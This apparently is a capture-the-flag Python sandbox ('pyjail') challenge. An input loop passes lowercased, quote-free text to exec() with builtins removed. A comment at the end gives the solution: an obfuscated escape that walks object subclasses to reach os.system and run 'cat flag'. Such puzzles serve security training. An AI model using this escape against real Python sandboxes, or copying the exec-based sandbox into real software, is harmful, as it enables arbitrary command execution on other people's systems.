#!/usr/bin/python3.8
#coding=utf8
from sys import version
import os

def main():
    print(f'{version}\n')
    print('[*] Only \U0001F47D are allowed!\n')
    for _ in range(10):
        text = input('>>> ').lower()
        if "'" in text or '"' in text:
            print('\U000026D4 No quotes are allowed! \U000026D4\n\nExiting..\n')
            break
        else:
            exec(text, {'__builtins__': None, 'print':print})

if __name__ == "__main__":
    main()


'''
print(({}.__class__.__base__.__subclasses__()[94].__init__.__globals__[{}.__class__.__base__.__subclasses__()[6]([95, 95, 98, 117, 105, 108, 116, 105, 110, 115, 95, 95]).decode()])[{}.__class__.__base__.__subclasses__()[6]([95, 95, 105, 109, 112, 111, 114, 116, 95, 95]).decode()]({}.__class__.__base__.__subclasses__()[6]([111, 115]).decode()).__dict__[{}.__class__.__base__.__subclasses__()[6]([115, 121, 115, 116, 101, 109]).decode()]({}.__class__.__base__.__subclasses__()[6]([99, 97, 116, 32, 102, 108, 97, 103]).decode()))
'''
